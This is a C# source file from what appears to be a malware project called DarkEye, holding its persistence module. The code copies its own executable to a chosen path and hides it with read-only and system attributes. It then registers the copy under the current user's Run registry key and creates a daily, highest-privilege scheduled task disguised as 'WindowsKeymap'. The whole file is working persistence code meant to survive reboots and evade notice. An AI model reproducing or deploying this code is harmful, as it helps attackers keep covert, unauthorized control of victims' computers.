using DarkEye.Classes.Utils;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace DarkEye.Classes.Managers
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class DuplicateManager
    {
        public String path;

        public DuplicateManager(String path) { this.path = path; }

        public void Init()
        {
            WriteUtils.write("Initialization: DuplicateManager");
            if (DarkEye.commandManager.IsWritenCommand("-duplicate")) return;
            this.Copyme(this.path);
            this.AutoRun(this.path);
            this.Scheduler(true, "daily", "highest", "WindowsKeymap", string.Concat("\"", this.path, "\""));
        }

        public void Copyme(String path)
        {
            try
            {
                File.Copy(Utils.Utils.GetThisPath(), path, true);
                File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.System);
                WriteUtils.write("Copyme: Copied to: " + path);
            }
            catch (Exception ex)
            {
                WriteUtils.writeError("Copyme: Failed " + ex.Message);
                return;
            }
        }

        public void AutoRun(String path)
        {
            try
            {
                String str = path;
                if (!DarkEye.commandManager.IsWritenCommand("-duplicate")) str = str + " -duplicate";
                str = str + " " + DarkEye.commandManager.GetWritenCommands();
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue(Utils.Utils.GetThisName(), str);
                WriteUtils.write("AutoRun: Registered!");
            }
            catch (Exception ex)
            {
                WriteUtils.writeError("AutoRun: " + ex.Message);
            }
        }

        public bool Scheduler(bool status, string timeset, string priority, string taskname, string filepath)
        {
            if (string.IsNullOrWhiteSpace(taskname) || string.IsNullOrWhiteSpace(filepath)) return false;
            ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                CreateNoWindow = false,
                WindowStyle = PwsHide
            };
            try
            {
                switch (status)
                {
                    case true:
                        startInfo.Arguments = string.Concat("/create /sc ", timeset, " /rl ", priority, " /tn ", taskname, " /tr ", filepath, " /f");
                        WriteUtils.write("Scheduler: Created task \"" + taskname + "\"");
                        break;
                    case false:
                        startInfo.Arguments = string.Concat("/delete /tn ", taskname, " /f");
                        WriteUtils.write("Scheduler: Deleted task \"" + taskname + "\"");
                        break;
                }
                using (Process info = Process.Start(startInfo))
                {
                    info.Refresh();
                    info.WaitForExit();
                    WriteUtils.write("Scheduler: Started!");
                }
            }
            catch (Exception ex) { WriteUtils.writeError("Scheduler: " + ex.Message); }
            startInfo = null; return true;
        }
    }
}
